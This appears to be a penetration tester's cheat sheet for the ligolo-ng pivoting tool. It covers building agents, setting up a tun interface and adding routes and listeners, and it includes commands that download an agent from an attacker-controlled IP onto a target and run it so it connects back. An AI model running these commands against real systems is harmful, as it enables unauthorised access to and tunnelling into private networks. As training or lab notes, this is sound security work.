git clone https://github.com/nicocha30/ligolo-ng.git     
  
# Compiling Agents (If from source)  
  
## Linux Agents/Proxy  
```
go build -o agent cmd/agent/main.go  
go build -o proxy cmd/proxy/main.go  
```
  
## Windows agents  
```
GOOS=windows go build -o agent.exe cmd/agent/main.go  
```
 
# Add interface to kali and turn it on  
```
sudo ip tuntap add user kali mode tun ligolo  
sudo ip link set ligolo up  
```
  
# Start ligolo locally  
```
./proxy -selfcert  
```
  
# Put up agent on remote target  
```powershell
IWR http://192.168.45.193/ligolo-ng/agent.exe -UseBasicParsing -Outfile agent.exe 
./agent.exe -connect 192.168.45.193:11601 -ignore-cert
```


```bash
curl http://192.168.45.249/ligolo-ng/agent > /tmp/agent 
./agent -connect 192.168.45.249:11601 -ignore-cert  
```
  
# Run as a another job  
```powershell
start-job -scriptblock {C:\windows\temp\agent.exe -connect 192.168.45.215:11601 -ignore-cert}  
```
  
# Add route locally for to access new networks   
```bash
sudo ip route add 172.16.6.0/24 dev ligolo  
```
# "Magic" IP for accessing an agents localhost  
```
sudo ip route add 240.0.0.1/32 dev ligolo
```
# Start tunnel (in ligolo prompts)  
```bash
session  
(select session)  
start  
```
  
# Tear down ligolo interface  
```bash
sudo ip link set ligolo down  
sudo ip link del ligolo  
```
# Add listeners to agent  
```bash
listener_add --addr 0.0.0.0:8080 --to 192.168.45.180:80  
listener_add --addr 0.0.0.0:50000 --to 10.10.17.152:50000
```